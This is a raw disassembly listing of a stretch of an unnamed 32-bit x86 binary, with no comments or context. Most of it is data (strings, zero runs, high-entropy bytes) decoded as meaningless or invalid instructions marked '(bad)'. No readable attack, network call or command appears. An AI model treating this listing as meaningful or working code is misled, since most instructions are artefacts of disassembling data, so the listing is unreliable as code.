  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx+0x72004335]
  413b8f:	push   0xfa8f4145
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	xchg   esi,eax
  413bd7:	add    BYTE PTR [ebx+0x0],al
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	mov    edx,0x4310
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x500d5414]
  413ea4:	adc    al,0xcf
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [esi],bh
  413eaf:	jecxz  0x413f11
  413eb1:	xor    dh,al
  413eb3:	cli    
  413eb4:	pop    ebx
  413eb5:	loope  0x413e5c
  413eb7:	scas   al,BYTE PTR es:[edi]
  413eb8:	xchg   edi,eax
  413eb9:	lds    ecx,FWORD PTR [ebx+0x64769bbd]
  413ebf:	add    WORD PTR [edi*1-0x66590f8f],bx
  413ec7:	popa   
  413ec8:	mov    ch,0x33
  413eca:	cmp    bl,ah
  413ecc:	mov    ebx,0xc5b9478b
  413ed1:	push   ecx
  413ed2:	xchg   edx,eax
  413ed3:	dec    edx
  413ed4:	xor    BYTE PTR [ebx-0x55c01b24],bh
  413eda:	out    dx,eax
  413edb:	arpl   WORD PTR [ecx+esi*8-0x77],sp
  413edf:	test   edx,ebp
  413ee1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413ee3:	xchg   edi,eax
  413ee4:	or     bl,BYTE PTR [ebx]
  413ee6:	push   0x447d8e64
  413eeb:	test   DWORD PTR [edx-0x76],0xa2e0a8e9
  413ef2:	inc    edx
  413ef3:	add    eax,0xb409978b
  413ef8:	adc    edi,DWORD PTR [edi]
  413efa:	pop    ss
  413efb:	daa    
  413efc:	cmp    dl,BYTE PTR [ebx+esi*8-0x3a]
  413f00:	or     al,0x59
  413f02:	in     eax,dx
  413f03:	jp     0x413ed0
  413f05:	push   ecx
  413f06:	imul   edx,DWORD PTR [ecx+eiz*4],0xbf6ea1fc
  413f0d:	add    al,0xd8
  413f0f:	retf   0xba6
  413f12:	pusha  
  413f13:	xchg   edi,eax
  413f14:	cmp    ebp,0x19
  413f17:	int    0xc9
  413f19:	das    
  413f1a:	or     cl,BYTE PTR [edx-0xa]
  413f1d:	mov    cl,BYTE PTR [edx]
  413f1f:	jg     0x413f44
  413f21:	dec    ebp
  413f22:	pop    edi
  413f23:	adc    al,0x8d
  413f25:	outs   dx,BYTE PTR ds:[esi]
  413f26:	cmp    eax,0xb715ee67
  413f2b:	out    dx,eax
  413f2c:	test   BYTE PTR [eax+0x160001f3],ch
  413f32:	aas    
  413f33:	ds pushf 
  413f35:	(bad)  
  413f37:	add    bl,BYTE PTR [eax+0x9f8e167]
  413f3d:	fist   DWORD PTR [esi-0x2a]
  413f40:	mov    ebx,0x21362a80
  413f45:	inc    eax
  413f46:	jnp    0x413f9c
  413f48:	inc    ebx
  413f49:	fisub  WORD PTR [esi]
  413f4b:	or     edi,DWORD PTR [edx-0x52]
  413f4e:	push   cs
  413f4f:	ror    DWORD PTR [esi-0x4a335b29],1
  413f55:	mov    dh,0x38
  413f57:	ja     0x413f62
  413f59:	cdq    
  413f5a:	dec    ecx
  413f5b:	arpl   WORD PTR [edx-0x32],dx
  413f5e:	arpl   WORD PTR [eax+0x30],si
  413f61:	cmc    
  413f62:	loop   0x413fa6
  413f64:	ja     0x413f02
  413f66:	iret   
  413f67:	mov    dl,0x4a
  413f6a:	bound  edx,QWORD PTR [esi]
  413f6c:	daa    
  413f6d:	repnz sbb eax,0x24f0586f
  413f73:	aas    
  413f74:	fwait
  413f75:	push   cs
  413f76:	lahf   
  413f77:	lea    edx,[edi+0x7c]
  413f7a:	stc    
  413f7b:	ret    
  413f7c:	shl    ebp,1
  413f7e:	pop    eax
  413f7f:	push   ecx
  413f80:	fisttp QWORD PTR [ebx-0x5f0a4b4]
  413f86:	jmp    0x413fb4
  413f88:	inc    ebp
  413f89:	lds    esi,FWORD PTR [eax-0x57363ad4]
  413f8f:	shr    DWORD PTR [eax+ebx*4],cl
  413f92:	iret   
  413f93:	ins    BYTE PTR es:[edi],dx
  413f94:	out    0x69,al
  413f96:	sbb    al,0x6
  413f98:	mov    ebx,0x7f5f9e06
  413f9d:	arpl   WORD PTR [edi+0xe],dx
  413fa0:	mov    ecx,0xe8656b53
  413fa5:	or     ah,al
  413fa7:	mov    ebx,ebx
  413fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413faa:	sub    edi,DWORD PTR [edx-0x7fb3fdcd]
  413fb0:	outs   dx,BYTE PTR ds:[esi]
  413fb1:	lock adc eax,0xae60
	...
  414013:	add    BYTE PTR [eax],al
  414015:	add    BYTE PTR [edx-0x26],bl
  414018:	push   esi
  414019:	pusha  
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x141d73f9
  414025:	hlt    
  414026:	hlt    
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    bl,bh
  41402f:	fldenv ds:0x8ba9fdae
  414035:	sbb    eax,0x9ff80b53
  41403a:	lods   al,BYTE PTR ds:[esi]
  41403b:	mov    al,ds:0x483788c9
  414040:	push   ebx
  414041:	fistp  QWORD PTR [eax]
  414043:	jp     0x414037
  414045:	cwde   
  414046:	xchg   edx,eax
  414047:	fst    st(2)
  414049:	inc    esi
  41404a:	out    0xde,eax
  41404c:	sub    BYTE PTR [ecx+eax*1],al
  41404f:	scas   eax,DWORD PTR es:[edi]
  414050:	add    BYTE PTR [edi-0x4e2a405c],0xf
  414057:	xor    DWORD PTR [edi],esi
  414059:	(bad)  
  41405a:	push   edx
  41405b:	bound  ecx,QWORD PTR [edx+0x2c94027a]
  414061:	and    al,0x82
  414063:	push   edx
  414064:	adc    ch,BYTE PTR [eax+0x1c]
  414067:	sbb    ebx,edi
  414069:	ins    BYTE PTR es:[edi],dx
  41406a:	xor    ecx,ebp
  41406c:	sub    DWORD PTR [ebx-0x44],esp
  41406f:	push   edi
  414070:	push   ss
  414071:	ja     0x41407e
  414073:	mov    cl,BYTE PTR [edi]
  414075:	aam    0xad
  414077:	mov    ch,0x6
  414079:	enter  0xa5b,0x21
  41407d:	and    BYTE PTR [ebp-0x57dafb92],dl
  414083:	or     eax,0x9daa094b
  414088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414089:	xchg   edx,eax
  41408a:	mov    edx,DWORD PTR [eax-0x7cd3a333]
  414090:	xchg   edx,eax
  414091:	or     BYTE PTR [esi],cl
  414093:	outs   dx,BYTE PTR ds:[esi]
  414094:	pushf  
  414095:	sub    eax,0x9f923c43
  41409a:	add    ah,ch
  41409c:	jo     0x414039
  41409e:	mov    edx,0x212c9162
  4140a3:	sti    
  4140a4:	xor    ch,cl
  4140a6:	add    ch,bh
  4140a8:	pop    ecx
  4140a9:	data16 fisub DWORD PTR [ebx+0x703a8a5f]
  4140b0:	outs   dx,DWORD PTR ds:[esi]
  4140b1:	out    0x72,eax
  4140b3:	jmp    0x22f:0x6b6c7768
  4140ba:	jae    0x414098
  4140bc:	and    bh,BYTE PTR [ebx+0x0]
  4140bf:	mov    DWORD PTR [ebx-0x4ab9d60b],edi
  4140c5:	shl    BYTE PTR [edx+0x45],1
  4140c8:	jl     0x4140b5
  4140ca:	mov    ds:0xeee772f1,al
  4140cf:	xchg   BYTE PTR [edi],ah
  4140d1:	cmp    edi,ecx
  4140d3:	int3   
  4140d4:	pushf  
  4140d5:	jbe    0x4140e7
  4140d7:	stc    
  4140d8:	sbb    ecx,DWORD PTR [eax+0x7d58c287]
  4140de:	out    0x93,al
  4140e0:	push   es
  4140e1:	cmp    DWORD PTR [ebx-0x192cc56c],edi
  4140e7:	pop    ebp
  4140e8:	jp     0x414135
  4140ea:	mov    al,0xa6
  4140ec:	push   ebp
  4140ed:	jge    0x4140c7
  4140ef:	or     edi,DWORD PTR [edi-0x5d882815]
  4140f5:	sub    BYTE PTR [edi],dh
  4140f7:	mov    ah,0xa2
  4140f9:	jecxz  0x4140ea
  4140fb:	push   eax
  4140fc:	mov    dh,0x57
  4140fe:	cli    
  4140ff:	jg     0x414088
  414101:	xor    DWORD PTR [ecx],edi
  414103:	ja     0x4140f4
  414105:	popf   
  414106:	icebp  
  414107:	jge    0x414105
  414109:	dec    eax
  41410a:	inc    esp
  41410b:	scas   eax,DWORD PTR es:[edi]
  41410c:	or     DWORD PTR [edi+0x0],edx
  41410f:	arpl   WORD PTR [eax-0x5d],bx
  414112:	gs jle 0x4140c1
  414115:	cdq    
  414116:	jl     0x41417f
  414118:	(bad)  
  414119:	mov    ebx,0x17f37a46
  41411e:	xor    BYTE PTR [ecx],bl
  414120:	xchg   ebx,eax
  414121:	cwde   
  414122:	out    dx,eax
  414123:	mov    ch,0x6f
  414125:	push   cs
  414126:	and    eax,0x434999e5
  41412b:	imul   DWORD PTR [edi-0x3c]
  41412e:	mov    esi,0x2577c9eb
  414133:	lods   eax,DWORD PTR ds:[esi]
  414134:	add    eax,0x0
	...
  414195:	add    BYTE PTR [edx],al
  414197:	adc    al,BYTE PTR [ecx]
  414199:	mov    ds:0xb3a2b311,eax
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x8562ffb4
  4141a5:	xor    bh,bl
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [ebx+0x18],bl
  4141b0:	adc    DWORD PTR [edi],ecx
  4141b2:	xchg   ecx,eax
  4141b3:	cs dec ebp
  4141b5:	or     eax,0x2b081666
  4141ba:	ret    0xb544
  4141bd:	jo     0x4141a1
  4141bf:	pop    edi
  4141c0:	mov    al,0xe2
  4141c2:	adc    eax,0x7859219e
  4141c7:	pop    esp
  4141c8:	mov    BYTE PTR [edi-0x8],ah
  4141cb:	pusha  
  4141cc:	dec    edx
  4141cd:	mov    edi,0x8b94996
  4141d2:	jnp    0x4141f7
  4141d4:	dec    ebx
  4141d5:	pop    ecx
  4141d6:	(bad)  
  4141d7:	(bad)  
  4141d8:	retf   
  4141d9:	inc    ebx
  4141da:	mov    ch,0x65
  4141dc:	pusha  
  4141dd:	sub    ebx,DWORD PTR [ecx-0x157b55bc]
  4141e3:	mov    al,0x65
  4141e5:	retf   0x9d86
  4141e8:	pop    edx
  4141e9:	add    BYTE PTR [eax-0x3c],0xba
  4141ed:	xor    ebp,edx
  4141ef:	js     0x414176
  4141f1:	(bad)  
  4141f2:	pop    edi
  4141f3:	int    0xbf
  4141f5:	sub    DWORD PTR [eax-0x654d0434],0x6272d6eb
  4141ff:	sbb    ecx,DWORD PTR [ebp-0x335b4fdd]
  414205:	inc    esi
  414206:	jle    0x4141d6
  414208:	jle    0x41424f
  41420a:	fisubr DWORD PTR [esi]
  41420c:	jmp    0xd1e3:0x2d9ed952
  414213:	out    dx,eax
  414214:	imul   ebp,DWORD PTR [eax],0x15
  414217:	pop    es
  414218:	push   es
  414219:	std    
  41421a:	inc    ebx
